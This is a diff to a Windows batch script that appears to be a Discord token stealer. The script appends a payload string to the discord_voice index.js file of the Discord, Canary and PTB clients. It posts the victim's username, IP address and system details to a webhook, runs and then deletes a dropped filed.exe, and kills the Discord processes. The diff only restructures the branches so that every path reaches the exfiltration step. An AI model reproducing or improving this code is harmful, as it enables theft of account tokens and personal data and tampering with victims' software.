@@ -26,6 +26,7 @@ wmic cpu get name>>C:\temp\System_INFO.txt
 set "discord=%appdata%\Discord\0.0.306\modules\discord_voice\index.js"
 set "discordcanary=%appdata%\discordcanary\0.0.264\modules\discord_voice\index.js"
 set "discordptb=%appdata%\discordptb\0.0.52\modules\discord_voice\index.js"
+
 if not exist %discord% goto CANARY
 echo %str% >> "%appdata%\Discord\0.0.306\modules\discord_voice\index.js"
 GOTO CANARY
@@ -34,22 +35,15 @@ if not exist %discordcanary% goto PTB
 echo %str% >> "%appdata%\discordcanary\0.0.264\modules\discord_voice\index.js"
 GOTO PTB
 :PTB
-if not exist %discordptb% goto SEND
+if not exist %discordptb% goto SEND2
 echo %str% >> "%appdata%\discordptb\0.0.52\modules\discord_voice\index.js"
 GOTO SEND2
-:SEND
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%USERNAME%**\nTime and Date: %DATE% %TIME%\nIP Address: %IP%\n**Windows Info:**\n%WindowsInfo%\n\"}" Webhook 
-"C:\temp\filed.exe" --processStart filed.exe
-timeout 5 > NUL
-del C:\temp\filed.exe /f /q
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**DISCORD APP/PTB/CANARY Not Installed.**\"}" Webhook
-GOTO DEL
 :SEND2
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%USERNAME%**\nTime and Date: %DATE% %TIME%\nIP Address: %IP%\n**Windows Info:**\n%WindowsInfo%\n\"}" Webhook 
 "C:\temp\filed.exe" --processStart filed.exe
 timeout 5 > NUL
 del C:\temp\filed.exe /f /q
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**DISCORD APP/PTB/CANARY TOKEN:**\"}" Webhook
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**DISCORD APP/PTB/CANARY TOKEN (IF INSTALLED WILL APPEAR ELSE WONT):**\"}" Webhook
 taskkill /f /im Discord.exe
 taskkill /f /im DiscordCanary.exe
 taskkill /f /im DiscordPTB.exe
